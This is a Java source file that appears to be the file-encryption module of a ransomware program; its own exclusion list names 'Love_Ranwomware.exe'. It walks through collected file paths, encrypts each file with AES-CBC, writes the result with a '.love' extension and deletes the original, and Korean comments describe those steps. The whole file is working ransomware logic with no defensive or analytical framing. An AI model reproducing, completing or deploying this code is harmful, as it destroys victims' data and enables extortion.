package com.joke.logic;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashMap;
import java.util.List;
import java.util.Map.Entry;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import com.joke.object.PathAndResult;

public class FileEncryptionEncode {

    public List<PathAndResult> getFileEncryptionEncodeResultList(String key, String iv) {
        HashMap<String, List<String>> pathMap = new PathRead().getRootByPathRead();
        List<PathAndResult> resultList = new ArrayList<>();
        PathAndResult pathAndResult = null;

        for (Entry<String, List<String>> pathList : pathMap.entrySet()) {
            for (String path : pathMap.get(pathList.getKey())) {

                pathAndResult = new PathAndResult();
                pathAndResult.setPath(path);
                pathAndResult.setResult(_getFileToByte(path, key, iv));

                resultList.add(pathAndResult);
            }
        }

        return resultList;
    }

    private String _getFileToByte(String path, String key, String iv) {
        if (path == null) return "Failed";
        if (path.contains(".love")) return "Failed";
        if (path.contains("Love_Ranwomware.exe")) return "Failed";

        String result = null;

        try {
            File file = new File(path);
            byte[] byteFile =  new byte[(int) file.length()];

            FileInputStream fileInput = new FileInputStream(file);

            fileInput.read(byteFile);

            fileInput.close();

            result = _getByteToFile(file.getPath(), _encode(byteFile, key, iv));
        } catch (Exception e) {
            result = "Failed";
            e.printStackTrace();
        }
        
        return result;
    }

    private String _encode(byte[] data, String key, String iv) {
        String encryptedData = null;

        try {
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            SecretKeySpec keySpec = new SecretKeySpec(key.getBytes(), "AES");
            IvParameterSpec ivParamSpec = new IvParameterSpec(iv.getBytes());
            cipher.init(Cipher.ENCRYPT_MODE, keySpec, ivParamSpec);
            
            //평문을 암호화하는 과정
            byte[] byteEncryptedData = cipher.doFinal(data);

            try {
                encryptedData = Base64.getEncoder().encodeToString(byteEncryptedData);
            } catch (Exception e) {
                encryptedData = "false";
                e.printStackTrace();
            } catch (OutOfMemoryError e) {
                encryptedData = "false";
                e.printStackTrace();
            }
            // System.out.print(encryptedData);
        } catch (Exception e) {
            e.printStackTrace();
            encryptedData = "false";
        }
        
        return encryptedData;
    }

    private String _getByteToFile(String path, String data) {
        if ("false".equals(data)) return "Failed";

        try {
            FileOutputStream fileOutput = new FileOutputStream(new File(path + ".love"));
            byte[] fileByte = data.getBytes();
            fileOutput.write(fileByte, 0, fileByte.length);

            fileOutput.close();

            // 암호화 후 원본파일 삭제
            Files.deleteIfExists(Paths.get(path));
        } catch (Exception e) {
            e.printStackTrace();
            return "Failed";
        }

        return "Success";
    }
}
